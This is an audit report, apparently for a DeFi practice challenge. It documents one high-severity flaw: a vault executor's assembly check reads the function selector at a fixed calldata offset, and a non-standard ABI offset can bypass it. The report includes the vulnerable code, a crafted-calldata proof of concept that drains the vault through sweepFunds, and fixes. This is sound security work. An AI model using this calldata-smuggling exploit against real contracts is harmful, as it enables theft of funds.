---
title: ABI Smuggling Audit Report
author: Jack
date: January 19, 2026
header-includes:
  - \usepackage{titling}
  - \usepackage{graphicx}
---


Prepared by: [Jack](https://github.com/Jack-OuCJ)

# Table of Contents
- [Severity Classification](#severity-classification)
- [Summary](#summary)
- [Findings](#findings)
  - [High](#high)

# Severity Classification

| Severity         | Description |
| ---------------- | ----------- |
| ![high]          | A **directly** exploitable security vulnerability that leads to stolen/lost/locked/compromised assets or catastrophic denial of service. |
| ![medium]        | Assets not at direct risk, but the function of the protocol or its availability could be impacted. |
| ![low]           | A violation of common best practices or incorrect usage of primitives, which may not currently have a major impact on security. |
| ![informational] | Non-critical comments, recommendations or potential optimizations, not relevant to security. |

# Summary

| Severity         | Number of issues found |
| ---------------- | ---------------------- |
| ![high]          | 1                      |
| ![medium]        | 0                      |
| ![low]           | 0                      |
| ![informational] | 0                      |
| Total            | 1                      |

# Findings

## High

### [H-1] Fixed-offset inline assembly selector check in `execute()` is bypassable via non-standard ABI `bytes` offset field, enabling unauthorized vault fund withdrawal

**Description:** `AuthorizedExecutor::execute()` performs a security check using inline assembly that reads the `actionData` selector from a **hardcoded calldata offset** of `0x64`:

```solidity
function execute(address target, bytes calldata actionData) external nonReentrant returns (bytes memory) {
    assembly {
        let calldatasize := calldatasize()
        // ⚠️ Reads selector from fixed position 0x64 — assumes standard ABI encoding
        let actionSel := calldataload(0x64)
        let slot := wards.slot
        mstore(0x00, target)
        mstore(0x20, slot)
        let targetIsWard := sload(keccak256(0x00, 0x40))
        if and(targetIsWard, eq(actionSel, 0xd9caed12)) {  // 0xd9caed12 = withdraw selector
            revert("Unauthorized")
        }
    }
    // ⚠️ Actual execution uses Solidity-decoded actionData (follows offset field)
    return target.functionCall(actionData);
}
```

The function signature is `execute(address target, bytes calldata actionData)`. In standard ABI encoding, the `bytes` offset field at `0x24` points to `0x40`, placing `actionData`'s length at `0x44` and content starting at `0x64`. The assembly check exploits this assumption.

However, ABI specification only requires the offset field to be a valid pointer — it can point to **any position beyond the static parameters**. By setting the offset to `0x80` instead of `0x40`, an attacker pushes the actual `actionData` content to `0x84` onwards. The space at `0x44`–`0x83` becomes free-form filler, allowing the attacker to place a **fake (benign) selector** at position `0x64` to satisfy the assembly check, while the **real (unauthorized) selector** is placed at the Solidity-decoded content offset `0x84`.

```
Calldata layout (attack with offset=0x80):
0x00: execute selector
0x04: vault address (target)
0x24: 0x0000...0080        ← offset = 0x80 (non-standard)
0x44: 0x0000...0000        ← filler
0x64: <safe_selector>      ← assembly check reads this (passes!)
0x84: <real_length>
0xa4: <sweepFunds_selector> + <recovery> + <token>  ← Solidity executes this
```

**Impact:** An attacker can bypass the `withdraw` selector blacklist and call `sweepFunds(recovery, token)` on the vault — a function that transfers the vault's entire token balance to an arbitrary address. All DVT tokens stored in the vault can be stolen in a single transaction.

**Proof of Concept:**

```solidity
// Craft non-standard ABI encoding
bytes memory realActionData = abi.encodeCall(vault.sweepFunds, (recovery, token));

bytes memory craftedCalldata = abi.encodePacked(
    SomeExecutor.execute.selector,
    uint256(uint160(address(vault))),           // target
    uint256(0x80),                              // offset (non-standard: push content to 0x84)
    uint256(0),                                 // filler at 0x44
    bytes32(uint256(uint32(0x00000000))),        // fake selector at 0x64 (not withdraw)
    uint256(realActionData.length),             // actual length at 0x84
    realActionData                              // sweepFunds calldata
);

(bool success,) = address(executor).call(craftedCalldata);
// ✓ Assembly check sees safe selector at 0x64
// ✓ Solidity executes sweepFunds from 0xa4
// ✓ All DVT transferred to recovery
```

**Recommended Mitigation:**

1. **Do not use hardcoded calldata offsets for security checks.** Use Solidity's native parameter decoding instead, which correctly follows the offset field:

   ```diff
   function execute(address target, bytes calldata actionData) external nonReentrant returns (bytes memory) {
   -    assembly {
   -        let actionSel := calldataload(0x64)
   -        ...
   -        if and(targetIsWard, eq(actionSel, 0xd9caed12)) { revert("Unauthorized") }
   -    }
   +    bytes4 actionSel = bytes4(actionData[:4]);
   +    if (wards[target] && actionSel == SomeVault.withdraw.selector) revert Unauthorized();
       return target.functionCall(actionData);
   }
   ```

2. **Use an allowlist instead of a denylist:** Rather than blocking specific selectors, only permit a predefined set of authorized selectors for each `target`. This is more robust against unknown function calls.

[high]: https://img.shields.io/badge/-High-red "High"
[medium]: https://img.shields.io/badge/-Medium-orange "Medium"
[low]: https://img.shields.io/badge/-Low-yellow "Low"
[informational]: https://img.shields.io/badge/-Informational-blue "Informational"
